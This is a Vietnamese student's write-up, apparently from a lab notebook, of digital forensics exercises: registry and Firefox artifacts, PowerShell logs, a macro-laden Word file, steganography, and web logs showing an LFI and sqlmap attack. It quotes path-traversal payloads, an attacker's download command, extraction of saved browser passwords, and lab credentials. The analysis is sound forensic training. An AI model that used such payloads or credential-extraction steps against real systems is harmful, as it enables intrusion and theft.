## A. GitHub:
*Link tham khảo: [GitHub](https://github.com/vonderchild/digital-forensics-lab)*
### 1. Lab 01:
- If we wanted to list all the `.txt` files in the current directory, what command would we want to use?
> `ls *.txt`
- What command can we use to read the contents of the file `/etc/passwd`?
> `cat /etc/passwd`
- If we wanted to search for the string `Error` in all files in the `/var/log` directory, what would our command be?
> `grep -r "Error" /var/log`
- What would be the commands to calculate MD5 and SHA1 hashes of the file `/etc/passwd`?
> `md5sum /etc/passwd $$ sha1sum /etc/passwd`
- Use the `file` command to determine the type of the file `/usr/bin/cat` and explain the output in 2-3 sentences.
> ``` ubuntu
> kanrorikakemem@DESKTOP-ICMNRNE:~$ file /usr/bin/cat
> /usr/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=70bb40952afe7016b06511e5c96e926f1f4774ba, for GNU/Linux 3.2.0, stripped
> ```
> - `ELF 64-bit LSB pie executable`: Chương trình thực thi 64-bit theo định dạng ELF (Executable and Linkable Format), sử dụng kiểu LSB (Little Endian) và là PIE (Position Independent Executable).
> - `x86-64, version 1 (SYSV)`: Dành cho kiến trúc x86-64 theo chuẩn System V ABI.
> - File được liên kết động, sử dụng trình nạp động (`ld-linux`) để liên kết với các thư viện hệ thống khi chạy.
> - `BuildID[sha1]=...`: Mã định danh duy nhất của bản biên dịch.
> - `for GNU/Linux 3.2.0`: Được biên dịch để tương thích với kernel Linux ≥ 3.2.0.
> - `stripped`: Các biểu tượng gỡ lỗi (debug symbols) đã bị loại bỏ để giảm kích thước file.
- What command can we use to display all printable strings of length ≥ 8 in the file `/bin/bash`?
> `strings -n 8 /bin/bash`
- Given the following output of the `file` command, can you determine what’s wrong with this file?
```
$ file image.jpg
image.jpg: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ab23bf566f9a955769e5096dd98093eca750431, for GNU/Linux 3.2.0, not stripped
```
> File `image.jpg` là file ELF 64-bit pie executable (file thực thi nhị phân của Linux), tức là không phải file `.jpg` như trong tên.
- If we wanted to look for files modified in the last 30 minutes in `/home` directory, what command would we want to use?
Hint: Explore how you can use `find` command to achieve this.
> `find /home -type f -mmin -30 -print`
- What command can we use to display information about all active TCP connections on the system?
> `netstat -antp`
- Given image file, can you find a way to recover and view its contents?
Hint 1: A quick google search for “magic bytes” might help.
Hint 2: Explore how `hexedit` can help you here.
You may download the image using following command:
```
curl https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%2001/files/challenge.png -o challenge.png
```
> - Đề yêu cầu ta phục hồi và đọc nội dung của nó. Có hai hint được đưa ra là kiểm tra magic bytes và dùng `hexedit`.
> - Magic bytes của `.png`: `89 50 4E 47 0D 0A 1A 0A`
> - Tiến hành kiểm tra các bytes đầu bằng lệnh:
> ```
> hexdump -C challenge.png | head -n 16
> ```
> ![image](https://hackmd.io/_uploads/SkKXtrFalx.png)
> Có thể thấy rằng byte đầu tiên đáng lẽ là `89` nếu ảnh `.png` là hợp lệ, nhưng vì nó là `17` nên bị dịch trái một byte so với header thật (file thật có `29` = `0x50 - 0x27`, tức là không khớp, hay nói cách khác là dữ liệu bị dời đi, ta chỉ cần bỏ byte đầu tiên `0x17` thì sẽ hợp lệ).
> - Bỏ byte đầu:
> ![image](https://hackmd.io/_uploads/S1NU5Htaxl.png)
> - Kiểm tra lại file:
> ![image](https://hackmd.io/_uploads/SJ4d9Btpxl.png)
> - Mở file ra xem:
> ![image](https://hackmd.io/_uploads/HyYjqHY6gl.png)

### 2. Lab 02:
- Given the registry file of a system that was compromised, answer the following:
    - What’s the mouse double-click speed?
    - What’s the most recent typed path accessed as recorded in the registry?
    - What’s the new value added to the registry by the malware in order to establish persistence over the system?
Download registry file ở [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2002/files/NTUSER.DAT).
> - Sau khi kết nối và đưa `NTUSER.DAT`, vào tool Registry Editor của Eric Zimmerman, bấm chọn `Load Hive` trong `File`.
> - Tìm đến `NTUSER.DAT` và `Open`, sau đó đặt `Key name` là `ForensicsUser`.
> ![image](https://hackmd.io/_uploads/B1S0o7Ragg.png)
> - Vào nhánh `HKEY_LOCAL_MACHINE\ForensicsUser\Control Panel\Mouse` và xem giá trị `DoubleClickSpeed`.
> ![image](https://hackmd.io/_uploads/Hyt4jtA6ge.png)
> **$\rightarrow$ Tốc double_click cần tìm là 500.**
> - 'the most recent typed path' là giá trị có index lớn nhất (urlN) trong registry key, ở đây ta thấy trong địa chỉ:
> ```
> HKEY_LOCAL_MACHINE\ForensicsUser\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
> ```
> ![image](https://hackmd.io/_uploads/r17pzcCpex.png)
> **$\rightarrow$ Path cần tìm: `C:\Windows\System32\calc.exe`**
> - Malware thường thêm một giá trị vào Run/RunOnce keys để tự chạy lúc đăng nhập. Vào đường dẫn:
> ```
> HKEY_LOCAL_MACHINE\TempHive\Software\Microsoft\Windows\CurrentVersion\Run
> ```
> ![image](https://hackmd.io/_uploads/r1UcX5ATxg.png)
> **$\rightarrow$ Trong`Value Name` có `Malware` và `Data` của nó là `C:\Users\w\Desktop\malware.exe`.**
- Given the Firefox profile of a suspect, answer the following:
    - What’s the username and password stored in the saved logins?
    - What’s the most frequently visited website?
    - What’s the name of the file downloaded by the suspect?
Download Firefox profile ở [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2002/files/Firefox.zip).
> - Tải file `Firefox.zip` và unzip:
> ```
> cd ~
> wget https://github.com/vonderchild/digital-forensics-lab/raw/main/Lab%2002/files/Firefox.zip -O Firefox.zip
> unzip Firefox.zip -d firefox_profile
> ```
> - Kiểm tra thì ta có một thư mục:
> ![image](https://hackmd.io/_uploads/HkEG0W-Rgg.png)
> - Firefox mã hoá thông tin đăng nhập đã lưu bằng cách sử dụng master key trong file `key4.db` ở profile's directory. Để trích xuất usernames và passwords, ta có thể dùng tool `firefox_decrypt`:
> ![image](https://hackmd.io/_uploads/rk30CbZRxg.png)
> - Kiểm tra tiếp trong `Firefox`:
> ![image](https://hackmd.io/_uploads/SJhUMz-Cee.png)
> - Kiểm tra tiếp `Profiles`:
> ![image](https://hackmd.io/_uploads/BkW6MMZRxx.png)
> - Gán biến `PROFILE` chứa đường dẫn đến `s6upyldt.default-release`:
> - Ta có cú pháp cách dùng tool như sau:
> ```
> python3 firefox_decrypt.py <path>
> ```
> ![image](https://hackmd.io/_uploads/HJ-WBGbCex.png)
> - Áp dụng vào bài, khi đó:
> ![image](https://hackmd.io/_uploads/S1H7SzZ0xg.png)
> **$\rightarrow$ Vậy ta lấy được `Username` và `Password` đã lưu.**
> - Firefox lưu lịch sử duyệt web (URL, tiêu đề, số lần truy cập, thời gian,...) trong cơ sở dữ liệu SQLite có tên là `places.sqlite`. Ta xác định file này bằng `find`:
> ![image](https://hackmd.io/_uploads/r1VXUMbRlx.png)
> - Mở file bằng `sqlite3 <path>`, sau đó chạy truy vấn (`visit_count`: số lần truy cập trang; `ORDER BY visit_count DESC`; `LIMIT 10`: hiển thị 10 trang nhiều nhất):
> ![image](https://hackmd.io/_uploads/r1FRwzW0ex.png)
> - Nếu chạy bằng `sqlitebrowser places.sqlite`, truy vấn và `excute`:
> ![image](https://hackmd.io/_uploads/rya9wNZCxg.png)

> **$\rightarrow$ Từ output có thể thấy rằng `https://www.amazon.com/` là trang được truy cập nhiều nhất.**
> - Kiểm tra trong `/firefox_profile/Firefox/Profiles/s6upyldt.default-release/`:
> ![image](https://hackmd.io/_uploads/BJ8P47-Cgl.png)
> - `places.sqlite` là một tệp cơ sở dữ liệu SQLite sử dụng để lưu trữ lịch sử truy cập và bookmark của người dùng. Khi user download một tệp từ trình duyệt, Firefox sẽ ghi URL của tệp tải xuống vào bảng `moz_places`. 
> Mở `places.sqlite` bằng `sqlite3` và lọc theo đuôi `.exe`, `.zip`, `.pdf` hoặc URL có chứa `download`:
> ![image](https://hackmd.io/_uploads/BJj0bVZRxl.png)
> - Nếu chạy bằng `sqlitebrowser places.sqlite`, truy vấn và `excute`:
> ![image](https://hackmd.io/_uploads/H1GfPN-Agg.png)
> **$\rightarrow$ Từ output có thể thấy rằng `python-3.11.1-amd64.exe` là file được download xuống.**
- Given the PowerShell Event logs of a compromised system, answer the following:
    - What’s the command executed by the attacker to download a file on the system?
    - Can you analyze the downloaded file and understand what’s the purpose of that file?
The event logs file can be downloaded from [link https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab 02/files/Microsoft-Windows-PowerShell%254Operational.evtx
> - Đưa event logs file đã tải vào máy ảo và sử dụng tool Event Viewer tích hợp sẵn trong Windows. `Open Saved Log` và ta có:
> ![image](https://hackmd.io/_uploads/ryAkhmzAxx.png)
> - Dùng tính năng lọc Event ID `4104` (PowerShell Script Block Logging Event), nghĩa là nó được sinh ra mỗi khi Powershell thực thi command, ta có thể xem lại đoạn lệnh nào đã được chạy.
> - Sau khi lọc, dùng `Find...` tìm kiếm theo từ khoá `Invoke-WebRequest`:
>    - `Invoke-WebRequest` là cmdlet mặc định để thực thi HTTP(S) với cú pháp `Invoke-WebRequest -Uri <url> -OutFile <path>` hoặc `Invoke-WebRequest -Uri <url> | Select-Object -Expand Content` kết hợp với `IEX`.
>    - Nó thường được dùng để tải script hoặc binary từ Github.
>    - Khi ScriptBlockLogging bật, event `4104` thường lưu nguyên chuỗi đó.
>    - Ngoài ra có một số từ khoá khác để lọc mà ChatGPT gợi ý nhưng ta chỉ dùng được mỗi `Invoke-WebRequest`:
>    ![image](https://hackmd.io/_uploads/HyRuDwzRxe.png)
> - Sau khi lọc ta được ba kết quả. Chú ý có một event có nội dung `XML view` thế này:
> ``` XML
> - <Event > xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
>  - <System>
>     <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
>     <EventID>4104</EventID> 
>     <Version>1</Version> 
>     <Level>5</Level> 
>     <Task>2</Task> 
>     <Opcode>15</Opcode> 
>     <Keywords>0x0</Keywords> 
>     <TimeCreated SystemTime="2023-01-29T17:54:18.2648573Z" /> 
>     <EventRecordID>25</EventRecordID> 
>     <Correlation ActivityID="{fdf4d207-3468-0003-413b-f5fd6834d901}" /> 
>     <Execution ProcessID="8052" ThreadID="7960" /> 
>     <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
>     <Computer>DESKTOP-LS6AHAB</Computer> 
>     <Security UserID="S-1-5-21-373262212-2709455193-1596268631-1001" /> 
>   </System>
> - <EventData>
>     <Data Name="MessageNumber">1</Data> 
>     <Data Name="MessageTotal">1</Data> 
>     <Data Name="ScriptBlockText">Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%202/files/file.ps1 -OutFile "file.ps1"</Data> 
>     <Data Name="ScriptBlockId">7dbea6ce-aa78-4acb-bfe5-3b1ab970ac22</Data> 
>     <Data Name="Path" /> 
>    </EventData>
>   </Event>
> ```
> **$\rightarrow$ Có thể thấy rằng lệnh mà attacker đã chạy là:**
> ```
> Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%202/files/file.ps1 -OutFile "file.ps1"
> ```
> Nghĩa là tải file từ [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2002/files/file.ps1) dưới tên `file.ps1`.
> - Nội dung `file.ps1`:
> ``` ubuntu
> $data = "SGVsbG8sIHVzZSBmbGFne2V2M250X2wwZ3NfZjByX3RoM193MW59IGFzIHRoZSBhbnN3ZXIgdG8gdGhlIG9yaWdpbmFsIHF1ZXN0aW9uLg=="
> $flag = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
> Write-Output $flag
> ```
> Có thể thấy rằng `data` là một chuỗi Base64 và flag là ASCII chuyển từ `data`.
> - Chuyển sang ASCII:
> ![image](https://hackmd.io/_uploads/SJbmavfCll.png)
> Nếu chạy với Python:
> ``` py
> import base64
> b64 = "SGVsbG8sIHVzZSBmbGFne2V2M250X2wwZ3NfZjByX3RoM193MW59IGFzIHRoZSBhbnN3ZXIgdG8gdGhlIG9yaWdpbmFsIHF1ZXN0aW9uLg=="
> decoded = base64.b64decode(b64).decode('ascii')
> print(decoded)
> ```
> ![image](https://hackmd.io/_uploads/HkPV1_MRxg.png)
> **$\rightarrow$ Flag tìm được:** `flag{ev3nt_l0gs_f0r_th3_w1n}`

### 3. Lab 03:
#### a) Macro - Enabled Documents:
##### Đề bài:
- A phishing attack has been reported in your organization, where an employee received a malicious Word document in an email that appeared to come from a trusted source. The employee opened the document which had macros in it, resulting in the attacker gaining access to the employee’s computer. A secret which will reveal the attacker's identity, is embedded inside the macro code. You are tasked with analyzing the macro code and extracting the embedded secret.
- The secret has the format `flag{s0me_str1ng}`.
- Word document: [YealyBonus.docm](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2003/files/YearlyBonus.docm)

##### Phân tích cách làm:
- Dùng bộ tool `oletools` để phân tích macro từ file `YearlyBonus.docm`:
![image](https://hackmd.io/_uploads/By4kTVI7-g.png)
- Có thể thấy rằng VBA Macros được ước lượng rủi ro là `HIGH` và độc hại. Ta xem macro code nào được nhúng vào:
``` ubuntu
kanrorikakemem@DESKTOP-ICMNRNE:/mnt/c/Users/Ha Nguyen/Downloads$ olevba YearlyBonus.docm
olevba 0.60.2 on Python 3.10.12 - http://decalage.info/python/oletools
===============================================================================
FILE: YearlyBonus.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub ConvertByteArrayToString(byteArray() As Byte)
    Dim str As String
    str = "Oh, and almost forgot, here's something little cryptic for you: " + StrConv(byteArray, vbUnicode)
    MsgBox str
End Sub


Sub doShenanigans()
    Dim byteArray(0 To 100) As Byte
    byteArray(0) = 77
    byteArray(1) = 101
    byteArray(2) = 109
    byteArray(3) = 34
    byteArray(4) = 22
    byteArray(5) = 111
    byteArray(6) = 101
    byteArray(7) = 107
    byteArray(8) = 22
    byteArray(9) = 104
    byteArray(10) = 91
    byteArray(11) = 87
    byteArray(12) = 98
    byteArray(13) = 98
    byteArray(14) = 111
    byteArray(15) = 22
    byteArray(16) = 97
    byteArray(17) = 100
    byteArray(18) = 101
    byteArray(19) = 109
    byteArray(20) = 22
    byteArray(21) = 111
    byteArray(22) = 101
    byteArray(23) = 107
    byteArray(24) = 104
    byteArray(25) = 22
    byteArray(26) = 109
    byteArray(27) = 87
    byteArray(28) = 111
    byteArray(29) = 22
    byteArray(30) = 87
    byteArray(31) = 104
    byteArray(32) = 101
    byteArray(33) = 107
    byteArray(34) = 100
    byteArray(35) = 90
    byteArray(36) = 22
    byteArray(37) = 87
    byteArray(38) = 22
    byteArray(39) = 76
    byteArray(40) = 56
    byteArray(41) = 55
    byteArray(42) = 22
    byteArray(43) = 99
    byteArray(44) = 87
    byteArray(45) = 89
    byteArray(46) = 104
    byteArray(47) = 101
    byteArray(48) = 22
    byteArray(49) = 89
    byteArray(50) = 94
    byteArray(51) = 87
    byteArray(52) = 98
    byteArray(53) = 98
    byteArray(54) = 91
    byteArray(55) = 100
    byteArray(56) = 93
    byteArray(57) = 91
    byteArray(58) = 36
    byteArray(59) = 0
    byteArray(60) = 0
    byteArray(61) = 79
    byteArray(62) = 101
    byteArray(63) = 107
    byteArray(64) = 104
    byteArray(65) = 22
    byteArray(66) = 92
    byteArray(67) = 98
    byteArray(68) = 87
    byteArray(69) = 93
    byteArray(70) = 22
    byteArray(71) = 95
    byteArray(72) = 105
    byteArray(73) = 48
    byteArray(74) = 22
    byteArray(75) = 92
    byteArray(76) = 98
    byteArray(77) = 87
    byteArray(78) = 93
    byteArray(79) = 113
    byteArray(80) = 105
    byteArray(81) = 107
    byteArray(82) = 89
    byteArray(83) = 94
    byteArray(84) = 85
    byteArray(85) = 99
    byteArray(86) = 42
    byteArray(87) = 89
    byteArray(88) = 104
    byteArray(89) = 38
    byteArray(90) = 85
    byteArray(91) = 99
    byteArray(92) = 107
    byteArray(93) = 89
    byteArray(94) = 94
    byteArray(95) = 85
    byteArray(96) = 109
    byteArray(97) = 38
    byteArray(98) = 109
    byteArray(99) = 23
    byteArray(100) = 115

    For iter = 0 To 100
        byteArray(iter) = byteArray(iter) + 3
    Next

    Call ConvertByteArrayToString(byteArray)
End Sub

Sub AutoOpen()

    Dim str As String
    str = "You have been hacked!"
    MsgBox str

    Call doShenanigans

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+
```
- Chú ý đoạn code trong output, đây là VBA macro che giấu chuỗi bằng cách +3 mỗi byte rồi `StrConv(byteArray, vbUnicode)` để biến mảng byte thành chuỗi Unicode. Ta giải mã nó bằng cách -3 mỗi byte rồi chuyển nó về string nhưng không ra cái gì cả :DD
![image](https://hackmd.io/_uploads/ryGCNBUQWl.png)
- Search cách giải trên mạng thì tìm được gợi ý như sau:
![image](https://hackmd.io/_uploads/BJRxHBL7Ze.png)
- Vì họ nói rằng đoạn mã bị thay đổi nhẹ nhưng không phải +3 nên ta copy cả mảng số dán vào [ASCII Shift Cipher](https://www.dcode.fr/ascii-shift-cipher) rồi decrypt:
![image](https://hackmd.io/_uploads/H1FWIBIQWg.png)
- Output có được:
```
Wow, you really know your way around a VBA macro challenge.

Your flag is: flag{such_m4cr0_much_w0w!}
```
##### Kết quả:
`flag{such_m4cr0_much_w0w!}`

#### b) Presentation:
##### Đề bài:
- A mole within the government has leaked top secret information to a spy. The mole, aware of spycraft techniques, used steganography to hide the information within an image, which he then slipped to his handler. The spy received the image and pasted it into a PowerPoint document, covering it with multiple random images to conceal it. One of our spies has gained access to the enemy spy's computer and recovered the PowerPoint document. Your mission is to extract the first image, extract the top secret information as well as the name and location of his source inside the government.
- Powerpoint document: [Presentation.pptx](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2003/files/Presentation.pptx)

##### Phân tích cách làm:
- Ta được một file `.pptx`, OOXML format lưu trữ Office documents dưới dạng tệp ZIP nên file có được thực chất chỉ là ZIP files. Đổi đuôi thành `.zip` rồi giải nén nó. Sau đó vào phần `\Presentation\ppt\media\`:
![image](https://hackmd.io/_uploads/r1HL9H8QWl.png)
- Có 51 ảnh tất cả, trừ `image1.jpg` có dung lượng là 47KB thì toàn bộ còn lại đều là `.png` và có dung lượng nhỏ hơn nên khả năng cao `image1.jpg` chính là đối tượng cần tìm.
- Copy ảnh rồi đổi tên nó thành `stego.jpg` rồi kiểm tra metadata:
![image](https://hackmd.io/_uploads/HJr9TH8Qbl.png)
$\rightarrow$ Nội gián là `Michael Scott`, vị trí là `34.2109, -118.4364` hay `Los Angeles, California, USA`.
- Dùng tool `steghide` để trích các message khỏi ảnh thành file `.txt` (nhấn `Enter` khi bị hỏi pass) rồi đọc nội dung file `.txt` đó:
![image](https://hackmd.io/_uploads/H19j0rLmZe.png)

##### Kết quả:
- Nội gián: `Michael Scott`
- Vị trí: `34.2109, -118.4364` hay `Los Angeles, California, USA`
- Thông tin mật:
```
I have obtained information regarding a top secret mission. The details are highly classified and must not fall into the wrong hands. Proceed with caution and use extreme discretion in all communications regarding this matter.
```

#### c) super_secret_audio:
##### Đề bài:
- Provided with the audio file from the Audio Steganography section, figure out how you can view the spectogram and recover the flag using Audacity. Submit a screenshot.
- Audio file: [super_secret_audio.wav](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2003/files/super_secret_audio.wav)

##### Phân tích cách làm:
- Tải [Audacity](https://www.audacityteam.org/) và import file âm thanh vào:
![image](https://hackmd.io/_uploads/r17YWY8QZl.png)
- Chuyển sang chế độ `Spectrogram`:
![image](https://hackmd.io/_uploads/B1GabY8QWx.png)
![image](https://hackmd.io/_uploads/Bkb1MFLmZg.png)

##### Kết quả:
`flag{h1dd3n_1n_th3_n01s3}`

### 4. Lab 04:
- The logs can be downloaded from https://github.com/vonderchild/digital-forensics-lab/tree/main/Lab%2004/files/logs.zip.
- You are a cyber security specialist who has been called upon to investigate a major cyber security breach. The company's web server has been compromised, and the attacker has attempted to exploit multiple vulnerabilities. You've been given the task of piecing together the attacker's intentions and uncovering the extent of the damage. With that in mind, your challenge is to answer the following questions:
> Trước khi làm ta cần phải set up môi trường:
> ![image](https://hackmd.io/_uploads/BypBACoV-x.png)
> ![image](https://hackmd.io/_uploads/rkaSy12E-g.png)

#### 1. What IP address does the attack seem to be originating from?
- Trong web server log, mỗi dòng thường bắt đầu bằng:
```
IP - - [time] "REQUEST" STATUS SIZE "REFERER" "USER-AGENT"
```
- Attacker thường gửi rất nhiều requests và requests sẽ độc hại hoặc bất thường nên ta sẽ đếm số request theo IP:
![image](https://hackmd.io/_uploads/rkV2myhVZe.png)
Với `awk '{print $1}'` để lấy IP, `uniq -c` để đếm và `sort -nr` để đẩy IP có số request nhiều nhất lên đầu. Kết quả là ta được output là IP `192.168.0.106` với số lần gửi request là `38`.
- Để kiểm tra IP trên có request độc hại không: `grep 192.168.1.100 access.log | less` (`grep` để lọc log và `less` để xem nội dung từng trang):
![image](https://hackmd.io/_uploads/HyIMWJnN-g.png)
Từ output trên, ta thấy rất nhiều `../` và `/etc/passwd` nên đây có thể là tấn công LFI.

**$\rightarrow$ Đáp án: `192.168.0.106`**

#### 2. Which vulnerabilities do you think are being exploited, and what evidence do you have to support your findings?
Từ câu 1, với các dấu hiệu như `../` và `/etc/passwd` nên đây có thể là tấn công LFI.
**$\rightarrow$ Đáp án: `Local File Inclusion (LFI)`**

#### 3. How can we determine what web browser the attacker is using?
- Ta cần xác định User-Agent. Các HTTP Header sẽ có dạng: `User-Agent: Mozilla/5.0 ...`
- Từ output ở câu 1, có thể thấy rằng ở cuối các request là `Firefox`.

**$\rightarrow$ Đáp án: `Firefox`**

#### 4. Did the attacker use any automated tools during the attack? If so, can you identify the name of the tool and its purpose?
- Ta có bảng sau:

| Tool     | User-Agent | Mục đích        |
| -------- | ---------- | --------------- |
| sqlmap   | `sqlmap`   | SQL Injection   |
| Nikto    | `Nikto`    | Scan web        |
| gobuster | `gobuster` | Directory brute |
| curl     | `curl/`    | Manual/Script |

- Từ ouput của câu 1, có thể thấy các dòng như:
```
192.168.0.106 - - [16/Feb/2023:01:36:55 +0500] "GET /users.php HTTP/1.1" 200 1117 "-" "sqlmap/1.6.11#stable (https://sqlmap.org)"
```
- Ngoài ra ta có thể dùng: `grep -i "sqlmap\|nikto\|curl\|python" access.log`:
![image](https://hackmd.io/_uploads/SkT2HynV-x.png)

**$\rightarrow$ Đáp án: `sqlmap` với mục đích là SQLi**

#### 5. Which file was the attacker trying to access but couldn't due to limited server access?
- Trong output có hai dòng:
```
192.168.0.106 - - [16/Feb/2023:01:36:02 +0500] "GET /d.php HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:36:07 +0500] "GET /database.php HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
- Ngoài ra có thể dùng cách:
![image](https://hackmd.io/_uploads/HyEEwJ24Ze.png)

**$\rightarrow$ Đáp án: `GET /d.php HTTP/1.1`, `GET /database.php HTTP/1.1`**

#### 6. Did the attacker gain access to any confidential data? If yes, how much data was compromised?
- Ta xem thử có request `200 OK` không, và từ output ở câu 1 ta thấy có rất nhiều nhưng lọc kĩ hơn:
![image](https://hackmd.io/_uploads/Bk_fjy2VZl.png)
Có thể thấy rằng lượng data là rất nhiều .-.
- Ngoài ra để xem thử xem có file nào nhạy cảm:
![image](https://hackmd.io/_uploads/HJ7Mu13Ebx.png)

#### 7. An important secret was compromised. Can you figure it out?
> Hint: The secret you're looking for is not in a `.sql` or a `.php` file.
- Trong output, ta thấy có dòng:
```
192.168.0.106 - - [16/Feb/2023:01:37:49 +0500] "GET /view.php?image=../../../../../../../../../important_note.txt HTTP/1.1" 200 501 "http://192.168.0.101:9090/images.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
Có thể thấy rằng attacker không đọc được secret bằng `images.php` nên dùng LFI để chuyển sang `view.php` rồi dùng LFI và đã thành công.
**$\rightarrow$ Đáp án: `important_note.txt`, `501 bytes`**

#### 8. The attacker left a message for the server administrator. Find out what the message said, and also mention how you were able to find it.
- Message khả năng cao nằm trong `important_note.txt`. Thông thường `modsec_audit.log` sẽ có thể ghi request, response body và payload nên ta tìm dấu hiệu của file `important_note.txt` trong log này bằng `grep -i "important_note" modsec_audit.log` và output rất dài .-.
- Đọc thử từng trang trong log này bằng `less modsec_audit.log`, và sau khi lướt mỏi tay thì:
![image](https://hackmd.io/_uploads/BJ7Jfg24-g.png)

**$\rightarrow$ Đáp án:**
```
Hey there! Just a heads up - if we don't add security checks to our web app, our top-secret files might as well be written on a billboard. And trust me, we don't want that kind of attention. So let's get those checks in place, okay? We wouldn't want the world to know that our password is 'sup3r_s3cr3t_4nd_1mp0rt4nt_p4ssw0rd', now would we? ;)
```

#### 9. What were some indicators that confirmed that an attack had taken place? What were your key takeaways from this attack?
- Có rất nhiều dấu hiệu, như các dấu hiệu thấy được khi giải các câu trên hay cảnh báo trong `less modsec_audit.log`:
![Ảnh chụp màn hình 2026-01-07 213504](https://hackmd.io/_uploads/Bke6zlhEbx.png)
Và quan trọng nhất là ta đã thấy lời nhắn mà attackers để lại :DD
- Các bài học học được:
    - Lỗi xác thực dữ liệu đầu vào có thể dẫn đến các lỗ hổng nghiêm trọng như LFI.
    - Các tệp văn bản đơn giản cũng có thể chứa thông tin nhạy cảm và cần được bảo vệ.
    - Các tool như sqlmap làm tăng tốc độ và tác động của một cuộc tấn công.
    - Web server log là bằng chứng quan trọng để tái tạo hành vi của attackẻ và xác định sự xâm nhập.

#### 10. Based on this attack, what indicators of compromise can be used to detect future attacks?
- Địa chỉ IP của attacker.
- Các requests lặp đi lặp lại từ một địa chỉ IP trong một khoảng thời gian ngắn.
- Các pattern URL chứa chuỗi duyệt thư mục (`../`, `%2F`).
- Các requests cố gắng truy cập các tệp hệ thống như `/etc/passwd`, `/etc/shadow`,...
- Các requests nhắm vào các endpoint nhạy cảm như `view.php`, `users.php` và `command.php`.
- Chuỗi User-Agent liên kết với các công cụ tự động (`sqlmap/1.6.11`,...)
- Các lần truy cập thất bại và thành công lặp đi lặp lại vào các file không công khai.
- Requests POST bất thường với các commands quản trị hoặc backend.

## B. TryHackMe:
### I. Task 10 - Windows Forensics 1:
*Link tham khảo: [TryHackMe](https://tryhackme.com/room/windowsforensics1)*
#### 1. Đề bài:
##### a) The Setup:
- If preferred, use the following credentials to log into the machine:
    - Username: `THM-4n6`
    - Password: `123`
- Once we log in, we will see two folders on the Desktop named triage and EZtools. The triage folder contains a triage collection collected through KAPE, which has the same directory structure as the parent. This is where our artifacts will be located. The EZtools folder contains Eric Zimmerman's tools, which we will be using to perform our analysis. You will also find RegistryExplorer, EZViewer, and AppCompatCacheParser.exe in the same folder.

**Note**: *Although the Autopsy tool on the Desktop can be used to solve this case, it is recommended that you use the EZtools, as demonstrated in this room.*

##### b) The Challenge:
- Now that we know where the required toolset is, we can start our investigation. We will have to use our knowledge to identify where the different files for the relevant registry hives are located and load them into the tools of our choice. Let's answer the questions below using our knowledge of registry forensics.

- **Scenario:**
One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached VM. Can you help Organization X with finding answers to the below questions?

**Note:** *When loading registry hives in RegistryExplorer, it will caution us that the hives are dirty. This is nothing to be afraid of. We just need to remember the little lesson about transaction logs and point RegistryExplorer to the .LOG1 and .LOG2 files with the same filename as the registry hive. It will automatically integrate the transaction logs and create a 'clean' hive. Once we tell RegistryExplorer where to save the clean hive, we can use that for our analysis and we won't need to load the dirty hives anymore. RegistryExplorer will guide you through this process.*

#### 2. Phân tích cách làm: 
- Kịch bản challenge cho biết rằng một Desktop ở phòng lab Organization X đã bị ai đó đột nhập trái phép. Bình thường chỉ có một account trên máy nhưng họ đã phát hiện ra rất nhiều accounts khác, và có vẻ kẻ đột nhập đã dùng USB để kết nối tới hệ thống.
- Khi vào lab, vì đây là máy ảo Windows 7 và ta nhận thấy rằng cần phải hiển thị các hidden file bằng cách vào `File Explorer Options` $\rightarrow$ `View` trong Search Bar và chọn `Shows hidden files, folders, and drivers`.
![image](https://hackmd.io/_uploads/ByoJufqAee.png)


##### a) How many user created accounts are present on the system?
- Để kiểm tra thông tin tài khoản của user, ta đi đến vị trí `SAM\Domains\Account\Users\` trong tool Registry Explorer (mở trong `EZtools`).
- Tại phần `Names`, ta được các account user sau:
![image](https://hackmd.io/_uploads/B13j_z50lx.png)
